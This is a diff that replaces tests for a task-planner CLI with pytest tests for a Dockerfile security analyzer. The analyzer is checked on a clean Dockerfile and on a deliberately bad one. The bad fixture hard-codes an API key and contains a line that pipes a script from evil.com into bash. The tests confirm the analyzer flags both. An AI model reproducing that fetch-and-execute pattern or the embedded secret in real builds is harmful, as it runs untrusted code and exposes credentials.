@@ -1,91 +1,89 @@
-"""Tests for quantum task planner CLI."""
+"""Tests for the CLI."""
 
-import pytest
 import json
-import tempfile
-from pathlib import Path
-from datetime import datetime
+import pytest
 from click.testing import CliRunner
-from unittest.mock import Mock, patch
-
-from src.quantum_task_planner.cli import cli, generate_example_schedule
+from docker_optimizer.cli import main
 
 
-class TestCLI:
-    """Test CLI functionality."""
-    
-    @pytest.fixture
-    def runner(self):
-        """Create CLI test runner."""
-        return CliRunner()
-    
-    def test_cli_help(self, runner):
-        """Test CLI help command."""
-        result = runner.invoke(cli, ['--help'])
-        assert result.exit_code == 0
-        assert "Quantum-Inspired Task Planner" in result.output
-    
-    def test_cli_version(self, runner):
-        """Test CLI version display."""
-        result = runner.invoke(cli, ['--version'])
-        assert result.exit_code == 0
-        assert "0.1.0" in result.output
-    
-    def test_generate_example_command(self, runner):
-        """Test generate-example command."""
-        with tempfile.TemporaryDirectory() as temp_dir:
-            output_file = Path(temp_dir) / "example.json"
-            
-            result = runner.invoke(cli, [
-                'generate-example',
-                '--output', str(output_file),
-                '--tasks', '5',
-                '--resources', '3',
-                '--complexity', 'medium'
-            ])
-            
-            assert result.exit_code == 0
-            assert output_file.exists()
-            
-            # Validate generated content
-            with open(output_file) as f:
-                data = json.load(f)
-                assert "id" in data
-                assert "tasks" in data
-                assert "resources" in data
-                assert len(data["tasks"]) == 5
-                assert len(data["resources"]) == 3
+@pytest.fixture
+def runner():
+    return CliRunner()
 
 
-class TestGenerateExample:
-    """Test example generation functionality."""
-    
-    def test_generate_example_schedule_simple(self):
-        """Test simple example generation."""
-        data = generate_example_schedule(3, 2, "simple")
-        
-        assert "id" in data
-        assert "name" in data
-        assert "tasks" in data
-        assert "resources" in data
-        assert len(data["tasks"]) == 3
-        assert len(data["resources"]) == 2
-    
-    def test_generate_example_schedule_complex(self):
-        """Test complex example generation."""
-        data = generate_example_schedule(4, 2, "complex")
-        
-        assert len(data["tasks"]) == 4
-        assert len(data["resources"]) == 2
-        
-        # Validate task structure
-        for task in data["tasks"]:
-            assert "id" in task
-            assert "name" in task
-            assert "duration_seconds" in task
-            assert "priority" in task
-            assert task["duration_seconds"] > 0
+@pytest.fixture
+def good_dockerfile(tmp_path):
+    df = tmp_path / "Dockerfile"
+    df.write_text(
+        "FROM python:3.12-slim\n"
+        "WORKDIR /app\n"
+        "COPY . .\n"
+        "RUN useradd -m appuser\n"
+        "USER appuser\n"
+        "HEALTHCHECK CMD curl -f http://localhost:8000/ || exit 1\n"
+        "CMD [\"python\", \"app.py\"]\n"
+    )
+    return str(df)
 
 
-if __name__ == "__main__":
-    pytest.main([__file__, "-v"])
+@pytest.fixture
+def bad_dockerfile(tmp_path):
+    df = tmp_path / "Dockerfile"
+    df.write_text(
+        "FROM ubuntu:latest\n"
+        "ENV API_KEY=supersecret\n"
+        "RUN curl https://evil.com/script.sh | bash\n"
+        "CMD [\"/bin/bash\"]\n"
+    )
+    return str(df)
+
+
+def test_analyze_help(runner):
+    result = runner.invoke(main, ["analyze", "--help"])
+    assert result.exit_code == 0
+    assert "DOCKERFILE" in result.output
+
+
+def test_analyze_good_file_exit_0(runner, good_dockerfile):
+    result = runner.invoke(main, ["analyze", good_dockerfile])
+    # No critical findings → exit 0
+    assert result.exit_code == 0
+
+
+def test_analyze_bad_file_exit_1(runner, bad_dockerfile):
+    result = runner.invoke(main, ["analyze", bad_dockerfile])
+    # Critical findings → exit 1
+    assert result.exit_code == 1
+
+
+def test_json_output(runner, bad_dockerfile):
+    result = runner.invoke(main, ["analyze", "--json", bad_dockerfile])
+    assert result.exit_code in (0, 1)
+    data = json.loads(result.output)
+    assert "findings" in data
+    assert "score" in data
+    assert isinstance(data["findings"], list)
+
+
+def test_json_contains_rule_ids(runner, bad_dockerfile):
+    result = runner.invoke(main, ["analyze", "--json", bad_dockerfile])
+    data = json.loads(result.output)
+    rule_ids = [f["rule_id"] for f in data["findings"]]
+    assert "RULE-08" in rule_ids  # secret in ENV
+    assert "RULE-16" in rule_ids  # curl | bash
+
+
+def test_min_severity_filters(runner, bad_dockerfile):
+    result_all = runner.invoke(main, ["analyze", "--json", "--min-severity", "info", bad_dockerfile])
+    result_crit = runner.invoke(main, ["analyze", "--json", "--min-severity", "critical", bad_dockerfile])
+    all_findings = json.loads(result_all.output)["findings"]
+    crit_findings = json.loads(result_crit.output)["findings"]
+    assert len(crit_findings) <= len(all_findings)
+    for f in crit_findings:
+        assert f["severity"] == "critical"
+
+
+def test_quiet_flag(runner, bad_dockerfile):
+    result = runner.invoke(main, ["analyze", "--quiet", bad_dockerfile])
+    assert result.output.strip() == ""
+    assert result.exit_code == 1
